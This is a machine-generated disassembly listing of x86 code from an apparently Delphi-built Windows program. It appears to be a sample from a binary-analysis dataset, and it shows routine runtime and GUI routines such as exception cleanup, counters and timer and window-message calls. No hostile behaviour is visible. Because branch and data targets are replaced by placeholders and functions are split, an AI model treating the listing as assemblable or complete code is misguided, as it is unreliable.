mov [ eax + 0x2e1 ] dl
call sub_451a88
sub_451b88
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_451a88
sub_451b9c
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_451a88
sub_451bb0
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_451d1b
jmp sub_4038a0
sub_451d22
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451d28
push ebx
mov ebx eax
mov eax ebx
call sub_43a200
mov eax ebx
call sub_43a384
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_451328
sub_451f9e
jmp sub_4038a0
sub_451fa5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451fac
push ebx
mov ebx edx
mov edx ebx
call sub_43a668
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_434620
pop ebx
retn
sub_452000
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452068
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_452018
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452068
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_452034
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452068
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45204c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452068
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4522e8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4522f4
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_452300
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45230c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_452318
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_452324
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_452330
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_416b18
pop esi
pop ebx
retn
sub_452344
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_452360
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416b18
pop esi
pop ebx
retn
sub_452374
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45237c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416b18
pop esi
pop ebx
retn
sub_452390
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45246c
mov eax [ eax + 0x54 ]
call sub_4169bc
retn
sub_452478
mov eax [ eax + 0x54 ]
call sub_416c5c
retn
sub_4526cb
jmp sub_4038a0
sub_45270f
jmp sub_4038a0
sub_452716
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_452764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452564
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ef0
pop esi
pop ebx
retn
sub_4527d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_416b18
pop esi
pop ebx
retn
sub_4527e4
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4529e9
jmp sub_4038a0
sub_4529f0
pop ebx
mov esp ebp
pop ebp
retn
sub_4529f8
inc [ eax + 0x8c ]
retn
sub_452a00
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_452a20
sub_452a20
xor edx edx
call sub_452e64
retn
sub_452e56
jmp sub_4038a0
sub_452edd
jmp sub_4038a0
sub_452eec
add eax 0x30
call sub_40cd4c
retn
sub_452f30
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4035ec#3
jmp sub_4035ec
sub_452f86
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_453655
jmp sub_4038a0
sub_45365c
pop ebx
mov esp ebp
pop ebp
retn
sub_4537e4
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_453810
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45383c
xor edx edx
call sub_453734
retn
sub_453844
mov dl 0x1
call sub_453734
retn
sub_4538b8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4538d0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45399d
jmp sub_4038a0
sub_4539a4
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4035ec#2
jmp sub_4035ec
sub_4546ec
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_454742
jmp sub_4035ec
sub_454829
jmp sub_4035ec
sub_454862
jmp sub_4038a0
sub_454869
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454870
call sub_40c89c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_454a69
jmp sub_4038a0
sub_454a70
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_454b37
jmp sub_4038a0
sub_454b3e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454d14
jmp sub_4038a0
sub_454d1b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454d7c
jmp sub_4038a0
sub_454d83
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454d8c
call sub_454b54
retn
j_sub_4035ec
jmp sub_4035ec
sub_454fd0
jmp sub_4038a0
sub_454fd7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455105
jmp sub_4038a0
sub_455264
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_455563
jmp sub_4038a0
sub_455592
jmp sub_4038a0
sub_45569e
jmp sub_4038a0
sub_4556a5
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_455a36
jmp sub_4038a0
sub_455a3d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455b60
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_455bab
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_455bbc
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_455bcc
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_455c3f
jmp sub_4038a0
sub_455c46
pop ebp
retn
sub_455c48
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_455bdc
call sub_403c70
call sub_455b60
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44b914
call sub_41660c
sub_455cd8
retn
sub_455cd9
jmp sub_4038a0
j_sub_455cd8
jmp sub_455cd8
sub_455ce0
pop ebp
retn
sub_455ce4
sub [ rw-data ] 0x1
retn
sub_455f4f
jmp sub_4038a0
sub_455fea
jmp sub_4038a0
sub_456010
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455ea8
call sub_4038d8
pop ebx
retn
sub_456218
jmp sub_4038a0
sub_45621f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4562c4
jmp sub_4038a0
sub_4562cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_4038a0#9
jmp sub_4038a0
sub_45637d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456588
jmp sub_4038a0
sub_45658f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4568a8
jmp sub_4038a0
sub_4568af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568d2
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4048cc
retn
sub_4568cb
jmp sub_4038a0
sub_4568d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4569f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
retn
j_sub_4038a0#8
jmp sub_4038a0
sub_456b70
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456b78
push 0x0
xor ecx ecx
call sub_456aa4
retn
sub_456b84
xor ecx ecx
mov edx 0x20
call sub_402b78
retn
sub_456e42
jmp sub_4038a0
sub_456e49
pop ebp
retn
sub_456ed1
jmp sub_4038a0
sub_456ed8
pop ebp
retn
sub_456edc
sub [ rw-data ] 0x1
retn
sub_456f97
add [ esp + 0x4 ] 0xfffffff4
jmp sub_457314
sub_456fa1
add [ esp + 0x4 ] 0xfffffff4
jmp sub_457328
sub_456fb5
add [ esp + 0x4 ] 0xfffffff4
jmp sub_457260
sub_456fc9
add [ esp + 0x4 ] 0xfffffff4
jmp sub_4572e4
sub_4570ad
add [ esp + 0x4 ] 0xffffffb4
jmp sub_4577a0
sub_457234
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403470
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_457304
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_457314
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_457328
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_4574b3
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050b0
retn
j_sub_4038a0#7
jmp sub_4038a0
j_sub_4574b3
jmp sub_4574b3
sub_4574c9
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_4574d4
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_4575ac
retn
j_sub_4038a0#6
jmp sub_4038a0
sub_457701
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457708
lea ecx [ eax + 0x3c ]
push ecx
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_456238
retn
sub ecx 0xfffffff4
sub_457724
lea ecx [ eax + 0x3c ]
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_4562e4
retn
sub_457734
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_457748
mov [ eax + 0x48 ] dl
retn
sub_45774c
push ebx
mov ebx eax
mov eax ebx
call sub_457734
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_457764
mov [ eax + 0x40 ] dl
retn
sub_457790
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_4577a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
j_sub_4038a0#5
jmp sub_4038a0
sub_4577dc
pop ebp
retn
sub_4577e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
sub_457821
jmp sub_4038a0
sub_457828
pop ebp
retn
sub_45782c
sub [ rw-data ] 0x1
retn
j_sub_4038a0#4
jmp sub_4038a0
sub_457860
pop ebp
retn
sub_457864
sub [ rw-data ] 0x1
retn
sub_457891
jmp sub_4038a0
sub_457898
pop ebp
retn
sub_45789c
sub [ rw-data ] 0x1
retn
sub_457f20
jmp sub_4038a0
sub_457f27
pop ebx
pop ecx
pop ebp
retn
sub_45804b
pop esi
pop ebx
retn
j_sub_4038a0#3
jmp sub_4038a0
sub_4582b8
pop ebp
retn
sub_4582bc
sub [ rw-data ] 0x1
retn
j_sub_4038a0#2
jmp sub_4038a0
sub_458781
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4587d6
retn
j_sub_4038a0
jmp sub_4038a0
j_sub_4587d6
jmp sub_4587d6
sub_4587de
pop ebp
retn
